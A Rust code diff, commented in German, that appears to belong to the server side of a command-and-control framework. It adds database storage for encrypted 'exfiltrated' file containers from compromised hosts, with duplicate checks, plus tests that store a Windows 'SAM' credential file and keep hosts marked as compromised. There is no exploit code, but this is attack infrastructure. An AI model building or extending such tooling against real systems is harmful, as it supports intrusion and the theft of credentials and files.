@@ -83,6 +83,11 @@ pub enum DbError {
     /// muss vor seiner Beute registriert sein.
     #[error("unbekannter Host {0} — der Host muss vor der Beute registriert sein")]
     UnbekannterHost(String),
+    /// Die Datei liegt bereits in der Ablage — gleiche `file_id`, gleicher
+    /// Host. Der Container traegt keine Frische; ein erneut eingespielter
+    /// Container ist ein Duplikat, kein neuer Fund (ISSUE-15, Befund 4).
+    #[error("Datei {0} ist fuer diesen Host bereits abgelegt")]
+    DoppelteDatei(String),
 }
 
 /// Die Server-Datenbank, thread-sicher um eine rusqlite-Connection.
@@ -108,6 +113,12 @@ impl Db {
             CREATE TABLE IF NOT EXISTS tasks (
                 id TEXT PRIMARY KEY, host_id TEXT, command TEXT,
                 status TEXT, result TEXT, created_at TEXT
+            );
+            CREATE TABLE IF NOT EXISTS files (
+                id TEXT PRIMARY KEY, host_id TEXT NOT NULL, file_id TEXT NOT NULL,
+                filename TEXT NOT NULL, plain_size INTEGER NOT NULL,
+                container TEXT NOT NULL, sealed_master TEXT, collected_at TEXT NOT NULL,
+                UNIQUE(host_id, file_id)
             );",
         )?;
 
@@ -121,6 +132,7 @@ impl Db {
             "secrets",
             &[("sealed_password", "TEXT"), ("sealed_master", "TEXT")],
         )?;
+        Self::ergaenze_spalten(&conn, "files", &[("sealed_master", "TEXT")])?;
 
         // Die Tabelle `secrets` bekommt erst hier ihre fachliche Identitaet:
         // ohne den UNIQUE-Index kann der Upsert keinen Konflikt erkennen.
@@ -201,9 +213,13 @@ impl Db {
             ip: req.ip.clone(),
             hostname: req.hostname.clone().unwrap_or_default(),
             os: req.os.clone().unwrap_or_default(),
+            // Ein leerer Status ist wie keiner: sonst umgeht der leere
+            // String die Nie-Herabstufen-Regel im Upsert und loescht den
+            // Stand des Hosts (Issue #69).
             status: req
                 .status
                 .clone()
+                .filter(|s| !s.is_empty())
                 .unwrap_or_else(|| c2::STATUS_DISCOVERED.into()),
             first_seen: now.clone(),
             last_seen: now,
@@ -440,6 +456,78 @@ impl Db {
             params![t.id, t.host_id, t.command, t.status, t.result, t.created_at],
         )?;
         Ok(())
+    }
+
+    /// Nimmt einen KXENC-Datei-Container an (Issue #31).
+    ///
+    /// Zwei Regeln, beide am Eingang:
+    /// - Der Host muss bekannt sein (ADR-0004) — eine Datei ohne Host ist
+    ///   eine Waisenzeile.
+    /// - Je `(host_id, file_id)` genau eine Zeile. Der Container traegt keine
+    ///   authentifizierte Frische; ein wiederholter Upload ist ein Duplikat
+    ///   und wird abgewiesen, nicht ueberschrieben.
+    pub fn insert_file(&self, upload: &c2::FileUpload) -> Result<c2::ExfiltratedFile, DbError> {
+        if !self.host_existiert(&upload.host_id)? {
+            return Err(DbError::UnbekannterHost(upload.host_id.clone()));
+        }
+        {
+            let conn = self.conn.lock().unwrap();
+            let mut stmt =
+                conn.prepare("SELECT 1 FROM files WHERE host_id = ?1 AND file_id = ?2")?;
+            let bekannt = stmt
+                .query(params![upload.host_id, upload.file_id])?
+                .next()?
+                .is_some();
+            if bekannt {
+                return Err(DbError::DoppelteDatei(upload.file_id.clone()));
+            }
+        }
+        let row = c2::ExfiltratedFile {
+            id: uuid::Uuid::new_v4().to_string(),
+            host_id: upload.host_id.clone(),
+            file_id: upload.file_id.clone(),
+            filename: upload.filename.clone(),
+            plain_size: upload.plain_size,
+            container: upload.container.clone(),
+            sealed_master: upload.sealed_master.clone(),
+            collected_at: now_rfc3339(),
+        };
+        self.conn.lock().unwrap().execute(
+            "INSERT INTO files (id, host_id, file_id, filename, plain_size, container, sealed_master, collected_at)
+             VALUES (?1, ?2, ?3, ?4, ?5, ?6, ?7, ?8)",
+            params![
+                row.id,
+                row.host_id,
+                row.file_id,
+                row.filename,
+                row.plain_size as i64,
+                row.container,
+                row.sealed_master,
+                row.collected_at
+            ],
+        )?;
+        Ok(row)
+    }
+
+    /// Liefert alle Datei-Container als C2-Protokoll.
+    pub fn list_files(&self) -> Result<Vec<c2::ExfiltratedFile>, DbError> {
+        let conn = self.conn.lock().unwrap();
+        let mut stmt = conn.prepare(
+            "SELECT id, host_id, file_id, filename, plain_size, container, sealed_master, collected_at FROM files",
+        )?;
+        let rows = stmt.query_map([], |r| {
+            Ok(c2::ExfiltratedFile {
+                id: r.get(0)?,
+                host_id: r.get(1)?,
+                file_id: r.get(2)?,
+                filename: r.get(3)?,
+                plain_size: r.get::<_, i64>(4)? as u64,
+                container: r.get(5)?,
+                sealed_master: r.get::<_, Option<String>>(6)?.unwrap_or_default(),
+                collected_at: r.get(7)?,
+            })
+        })?;
+        rows.collect::<Result<Vec<_>, _>>().map_err(Into::into)
     }
 
     /// Schreibt den Status und das Ergebnis eines Tasks zurueck.
@@ -844,6 +932,20 @@ mod tests {
         // Die naechste Registrierung bringt weder OS noch Status mit.
         registriere(&db, "10.0.0.5");
 
+        // Und eine dritte bringt einen **leeren String** — NULLIF muss ihn
+        // wie None behandeln, sonst loescht ein aelterer Agent das bekannte
+        // OS (Issue #69: die COALESCE/NULLIF-Regel war ungetestet).
+        db.upsert_host(&c2::RegisterRequest {
+            host_id: "10.0.0.5".into(),
+            ip: "10.0.0.5".into(),
+            hostname: None,
+            os: Some(String::new()),
+            status: Some(String::new()),
+            sealed_master: Some(String::new()),
+            master_key: None,
+        })
+        .expect("Registrierung mit leeren Feldern");
+
         let hosts = db.list_hosts().expect("hosts");
         assert_eq!(hosts.len(), 1);
         assert_eq!(
@@ -856,7 +958,80 @@ mod tests {
             c2::STATUS_COMPROMISED,
             "der Status wurde herabgestuft"
         );
+        assert_eq!(
+            hosts[0].sealed_master, "kx1:siegel",
+            "ein leeres Siegel hat das bekannte Material geloescht"
+        );
 
+        std::fs::remove_file(&path).ok();
+    }
+
+    /// Eine Datei ohne bekannten Host ist eine Waisenzeile (ADR-0004).
+    #[test]
+    fn eine_datei_ohne_bekannten_host_wird_abgewiesen() {
+        let path = std::env::temp_dir().join(format!("kx-datei-waise-{}", uuid::Uuid::new_v4()));
+        let db = Db::open(&path).expect("db");
+        let upload = c2::FileUpload {
+            host_id: "10.0.0.99".into(),
+            file_id: "000102030405060708090a0b0c0d0e0f".into(),
+            filename: "SAM".into(),
+            plain_size: 4096,
+            container: "a3hlbmM=".into(),
+            sealed_master: String::new(),
+        };
+        assert!(matches!(
+            db.insert_file(&upload),
+            Err(DbError::UnbekannterHost(_))
+        ));
+        assert!(db.list_files().expect("Liste").is_empty());
+        std::fs::remove_file(&path).ok();
+    }
+
+    /// Je `(host_id, file_id)` genau eine Zeile: der zweite Upload ist ein
+    /// Duplikat (409), kein neuer Fund — und die erste Zeile bleibt, wie sie
+    /// war. Derselbe Container auf einem **anderen** Host ist dagegen ein
+    /// eigener Fund.
+    #[test]
+    fn dieselbe_datei_wird_nicht_zweimal_abgelegt() {
+        let path = std::env::temp_dir().join(format!("kx-datei-dup-{}", uuid::Uuid::new_v4()));
+        let db = Db::open(&path).expect("db");
+        registriere(&db, "10.0.0.5");
+        registriere(&db, "10.0.0.6");
+        let upload = c2::FileUpload {
+            host_id: "10.0.0.5".into(),
+            file_id: "000102030405060708090a0b0c0d0e0f".into(),
+            filename: "SAM".into(),
+            plain_size: 4096,
+            container: "a3hlbmM=".into(),
+            sealed_master: "dmVyc2llZ2VsdA==".into(),
+        };
+        let erste = db.insert_file(&upload).expect("erste Datei");
+        assert!(matches!(
+            db.insert_file(&upload),
+            Err(DbError::DoppelteDatei(_))
+        ));
+        let files = db.list_files().expect("Liste");
+        assert_eq!(
+            files.len(),
+            1,
+            "das Duplikat hat eine zweite Zeile angelegt"
+        );
+        assert_eq!(
+            files[0], erste,
+            "das Duplikat hat die erste Zeile veraendert"
+        );
+        assert_eq!(
+            files[0].sealed_master, "dmVyc2llZ2VsdA==",
+            "das Schluesselmaterial der Datei ging verloren"
+        );
+
+        // Anderer Host, gleiche file_id: eigener Fund.
+        let anderer = c2::FileUpload {
+            host_id: "10.0.0.6".into(),
+            ..upload.clone()
+        };
+        db.insert_file(&anderer).expect("Datei des zweiten Hosts");
+        assert_eq!(db.list_files().expect("Liste").len(), 2);
         std::fs::remove_file(&path).ok();
     }
 
